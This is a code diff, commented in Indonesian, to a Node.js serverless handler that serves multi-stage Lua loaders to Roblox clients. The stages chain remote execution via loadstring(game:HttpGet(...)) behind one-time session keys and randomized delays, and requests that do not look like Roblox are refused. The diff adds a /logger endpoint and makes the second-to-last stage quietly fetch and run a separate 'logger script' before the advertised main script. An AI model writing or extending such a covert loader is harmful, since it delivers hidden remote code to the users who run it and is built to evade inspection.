@@ -4,7 +4,7 @@ const https = require('https');
 // SETTINGS
 // ============================
 const SETTINGS = {
-    TOTAL_LAYERS: 5,  // BISA DIUBAH SESUAI KEHENDAK
+    TOTAL_LAYERS: 5,  // BISA DIUBAH BERAPAPUN
     MIN_WAIT: 112, 
     MAX_WAIT: 119, 
     SESSION_EXPIRY: 10000, 
@@ -57,6 +57,11 @@ async function sendSecurityLogToLogJs(message, ip, type) {
 module.exports = async function(req, res) {
     const url = req.url || "";
     
+    // ENDPOINT LOGGER
+    if (url.startsWith('/logger')) {
+        return handleLogger(req, res);
+    }
+    
     res.setHeader('Content-Type', 'text/plain');
     
     const now = Date.now();
@@ -87,6 +92,7 @@ module.exports = async function(req, res) {
     const totalLayers = SETTINGS.TOTAL_LAYERS;
     
     try {
+        // VALIDASI SESSION
         if (currentStep > 0) {
             const session = sessions[id];
             
@@ -130,6 +136,7 @@ module.exports = async function(req, res) {
             session.used = true;
         }
         
+        // LAYER 1: INISIALISASI (step 0)
         if (currentStep === 0) {
             const ipPart = cleanIp.split('.').pop() || "0";
             const seed = parseInt(ipPart) + Math.floor(Math.random() * 10000);
@@ -162,44 +169,12 @@ module.exports = async function(req, res) {
             return res.status(200).send(luaScript);
         }
         
+        // ==========================================
         // LAYER TENGAH (bukan logger, bukan main)
+        // index: 1 sampai totalLayers - 3
+        // ==========================================
         if (sessions[id].currentIndex < totalLayers - 2) {
             const session = sessions[id];
-            session.currentIndex++; 
-            
-            const ipPart = cleanIp.split('.').pop() || "0";
-            const seed = parseInt(ipPart) + Math.floor(Math.random() * 10000);
-            const newSessionID = seed.toString(36).substring(0, 4).padEnd(4, 'x');
-            
-            const nextStepNumber = session.stepSequence[session.currentIndex];
-            const nextKey = Math.random().toString(36).substring(2, 8); 
-            const waitTime = Math.floor(Math.random() * (SETTINGS.MAX_WAIT - SETTINGS.MIN_WAIT)) + SETTINGS.MIN_WAIT;
-            
-            sessions[newSessionID] = { 
-                ownerIP: session.ownerIP,
-                stepSequence: session.stepSequence,
-                currentIndex: session.currentIndex,
-                nextKey: nextKey, 
-                lastTime: now, 
-                startTime: session.startTime, 
-                keyCreatedAt: now, 
-                requiredWait: waitTime, 
-                used: false 
-            };
-            
-            delete sessions[id]; 
-            
-            const nextUrl = "https://" + host + currentPath + "?" + nextStepNumber + "." + newSessionID + "." + nextKey;
-            const luaScript = "task.wait(" + (waitTime / 1000) + ") loadstring(game:HttpGet(\"" + nextUrl + "\"))()";
-            return res.status(200).send(luaScript);
-        }
-        
-        // LAYER SEBELUM TERAKHIR: KIRIM LOGGER SCRIPT
-        if (sessions[id].currentIndex === totalLayers - 2) {
-            const session = sessions[id];
-            
-            const loggerScript = await fetchRaw(SETTINGS.LOGGER_SCRIPT_URL);
-            
             session.currentIndex++;
             
             const ipPart = cleanIp.split('.').pop() || "0";
@@ -225,15 +200,54 @@ module.exports = async function(req, res) {
             delete sessions[id];
             
             const nextUrl = "https://" + host + currentPath + "?" + nextStepNumber + "." + newSessionID + "." + nextKey;
-            const luaScript = loggerScript + "\n\ntask.wait(" + (waitTime / 1000) + ") loadstring(game:HttpGet(\"" + nextUrl + "\"))()";
-            
+            const luaScript = "task.wait(" + (waitTime / 1000) + ") loadstring(game:HttpGet(\"" + nextUrl + "\"))()";
             return res.status(200).send(luaScript);
         }
         
-        // LAYER TERAKHIR: KIRIM MAIN SCRIPT
+        // ==========================================
+        // LAYER SEBELUM TERAKHIR (totalLayers - 2)
+        // KIRIM SCRIPT UNTUK LOAD LOGGER + LANJUT KE LAYER TERAKHIR
+        // ==========================================
+        if (sessions[id].currentIndex === totalLayers - 2) {
+            const session = sessions[id];
+            session.currentIndex++;
+            
+            const ipPart = cleanIp.split('.').pop() || "0";
+            const seed = parseInt(ipPart) + Math.floor(Math.random() * 10000);
+            const newSessionID = seed.toString(36).substring(0, 4).padEnd(4, 'x');
+            
+            const nextStepNumber = session.stepSequence[session.currentIndex];
+            const nextKey = Math.random().toString(36).substring(2, 8);
+            const waitTime = Math.floor(Math.random() * (SETTINGS.MAX_WAIT - SETTINGS.MIN_WAIT)) + SETTINGS.MIN_WAIT;
+            
+            sessions[newSessionID] = {
+                ownerIP: session.ownerIP,
+                stepSequence: session.stepSequence,
+                currentIndex: session.currentIndex,
+                nextKey: nextKey,
+                lastTime: now,
+                startTime: session.startTime,
+                keyCreatedAt: now,
+                requiredWait: waitTime,
+                used: false
+            };
+            
+            delete sessions[id];
+            
+            const nextUrl = "https://" + host + currentPath + "?" + nextStepNumber + "." + newSessionID + "." + nextKey;
+            const loggerUrl = "https://" + host + "/logger";
+            
+            // Script: load logger, tunggu, lanjut ke layer terakhir
+            const luaScript = "loadstring(game:HttpGet(\"" + loggerUrl + "\"))() task.wait(" + (waitTime / 1000) + ") loadstring(game:HttpGet(\"" + nextUrl + "\"))()";
+            return res.status(200).send(luaScript);
+        }
+        
+        // ==========================================
+        // LAYER TERAKHIR (totalLayers - 1)
+        // KIRIM MAIN SCRIPT
+        // ==========================================
         if (sessions[id].currentIndex === totalLayers - 1) {
             const mainScript = await fetchRaw(SETTINGS.REAL_SCRIPT_URL);
-            
             delete sessions[id];
             return res.status(200).send(mainScript || '');
         }
@@ -243,3 +257,29 @@ module.exports = async function(req, res) {
         return res.status(getRandomError()).send(plainResp || "SECURITY : BANNED ACCESS!");
     }
 };
+
+// ==========================================
+// ENDPOINT LOGGER
+// ==========================================
+async function handleLogger(req, res) {
+    res.setHeader('Content-Type', 'text/plain');
+    
+    const ip = req.headers['x-real-ip'] || req.headers['x-forwarded-for']?.split(',')[0] || "unknown";
+    const agent = req.headers['user-agent'] || "";
+    const cleanIp = ip.replace('::ffff:', '');
+    
+    const isRoblox = agent.includes("Roblox") && 
+                     (req.headers['roblox-id'] || req.headers['x-roblox-place-id'] || agent.includes("RobloxApp"));
+    
+    if (!isRoblox || blacklist[cleanIp] === true) {
+        return res.status(403).send("-- ACCESS DENIED");
+    }
+    
+    const loggerScript = await fetchRaw(SETTINGS.LOGGER_SCRIPT_URL);
+    
+    if (!loggerScript) {
+        return res.status(404).send("-- LOGGER SCRIPT NOT FOUND");
+    }
+    
+    return res.status(200).send(loggerScript);
+            }
